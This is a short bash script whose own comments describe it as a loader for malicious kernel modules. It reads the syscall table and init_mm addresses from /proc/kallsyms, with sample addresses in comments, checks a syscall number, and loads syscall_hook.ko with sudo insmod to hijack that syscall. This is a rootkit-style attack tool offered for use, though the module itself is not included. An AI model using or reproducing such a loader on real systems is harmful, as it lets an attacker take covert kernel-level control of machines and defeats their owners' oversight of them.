#!/bin/bash

:<<EOF
	This script is used to load malicious kernel modules.
	
	This script must set three variables:
	"SYSCALL_TABLE" : Address of the system call table, you can find it in /proc/kallsyms.
	"INIT_MM" : Kernel memory management structure, you can find it in /proc/kallsyms.
    "SYS_ID" : The system call number that you want to hijack.
EOF

declare -i SYS_ID

SYSCALL_TABLE="" #0xffff800010ce17a0
INIT_MM="" #0xffff800011f89818
SYS_ID="29"

function usage(){
cat <<'EOF'
Usage: syscall_hook.sh SYSCALL_TABLE=xxx INIT_MM=xxx SYS_ID=xx
EOF
}

if [ ! -z $SYSCALL_TABLE ] && [ ! -z $INIT_MM ] && [ ! -z $SYS_ID ]; then
    if [ $SYS_ID -gt 456 -o $SYS_ID -lt 0 ]; then
        echo "Please enter SYS_ID between 0 and 456.";
        exit 1;
    fi
    echo "Loading malicious kernel modules...";
    sudo insmod syscall_hook.ko sys_call_table_addr=$SYSCALL_TABLE init_mm_addr=$INIT_MM syscall_nr=$SYS_ID
else
    if [ -z $SYSCALL_TABLE ]; then
        echo "Please set SYSCALL_TABLE";
    fi
    if [ -z $INIT_MM ]; then
        echo "Please set INIT_MM";
    fi
    if [ -z $SYS_ID ]; then
        echo "Please set SYS_ID";
    fi
    exit 1;
fi